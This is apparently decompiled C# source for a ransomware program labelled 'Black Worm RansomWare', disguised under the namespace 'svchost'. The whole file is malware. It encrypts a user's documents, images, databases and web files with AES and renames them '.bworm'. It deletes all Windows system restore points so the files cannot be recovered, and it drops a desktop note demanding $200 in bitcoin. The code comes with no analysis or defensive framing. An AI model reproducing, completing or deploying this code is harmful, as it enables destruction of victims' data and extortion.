using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class RansomWare
{
	private string userName;

	private string computerName;

	private string userDir;

	private string targetURL
	{
		[DebuggerNonUserCode]
		get;
		[DebuggerNonUserCode]
		set;
	}

	public RansomWare()
	{
		userName = Environment.UserName;
		computerName = Environment.MachineName.ToString();
		userDir = "C:\\Users\\";
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		checked
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < Math.Max(Interlocked.Decrement(ref length), checked(length + 1)))
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public object SendPassword(string password)
	{
		return password;
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".bworm");
	}

	public void encryptDirectory(string location, string password)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string[] directories = default(string[]);
		string[] array = default(string[]);
		string[] files = default(string[]);
		int num6 = default(int);
		int num7 = default(int);
		string extension = default(string);
		int num10 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int num8;
					int num11;
					int num9;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 445:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_00d8;
							case 4:
								goto IL_00e2;
							case 5:
								goto IL_00ec;
							case 6:
								goto IL_0103;
							case 7:
								goto IL_0110;
							case 8:
								goto IL_0121;
							case 9:
							case 10:
								goto IL_012f;
							case 11:
								goto IL_013b;
							case 12:
								goto IL_014b;
							case 13:
								goto IL_015a;
							default:
								goto end_IL_0001;
							case 14:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_015a:
						num = 13;
						num5++;
						goto IL_0164;
						IL_014b:
						num = 12;
						encryptDirectory(directories[num5], password);
						goto IL_015a;
						IL_000a:
						num = 2;
						array = new string[20]
						{
							".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
							".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
						};
						goto IL_00d8;
						IL_00d8:
						num = 3;
						files = Directory.GetFiles(location);
						goto IL_00e2;
						IL_00e2:
						num = 4;
						directories = Directory.GetDirectories(location);
						goto IL_00ec;
						IL_00ec:
						num = 5;
						num6 = files.Length - 1;
						num7 = 0;
						goto IL_00f9;
						IL_00f9:
						num8 = num7;
						num9 = num6;
						if (num8 <= num9)
						{
							goto IL_0103;
						}
						goto IL_013b;
						IL_0103:
						num = 6;
						extension = Path.GetExtension(files[num7]);
						goto IL_0110;
						IL_0110:
						num = 7;
						if (array.ToString()!.Contains(extension))
						{
							goto IL_0121;
						}
						goto IL_012f;
						IL_0121:
						num = 8;
						EncryptFile(files[num7], password);
						goto IL_012f;
						IL_012f:
						num = 10;
						num7++;
						goto IL_00f9;
						IL_013b:
						num = 11;
						num10 = directories.Length - 1;
						num5 = 0;
						goto IL_0164;
						IL_0164:
						num11 = num5;
						num9 = num10;
						if (num11 > num9)
						{
							goto end_IL_0001_2;
						}
						goto IL_014b;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 445;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public object startAction()
	{
		string password = CreatePassword(15);
		string text = "\\";
		string location = userDir + userName + text;
		A.ransompassword = Conversions.ToString(SendPassword(password));
		removeRestorePoint();
		encryptDirectory(location, password);
		messageCreator(A.BitcoinAddress);
		password = null;
		Application.Exit();
		object result = default(object);
		return result;
	}

	public object messageCreator(string BitcoitAddress)
	{
		string text = "\\Desktop\\READ_IT.txt";
		string path = userDir + userName + text;
		string[] contents = new string[4] { "[ Warning ]", "Your Files has been encrypted with Black Worm RansomWare", "Send 200$ of bitcoins to my Bitcoin Address", "Bicoint Address : " };
		File.WriteAllLines(path, contents);
		object result = default(object);
		return result;
	}

	public void removeRestorePoint()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
			ManagementObjectCollection instances = val.GetInstances();
			new StringBuilder();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					SRRemoveRestorePoint(checked((int)Conversions.ToUInteger(((ManagementBaseObject)val2).get_Item("sequencenumber"))));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
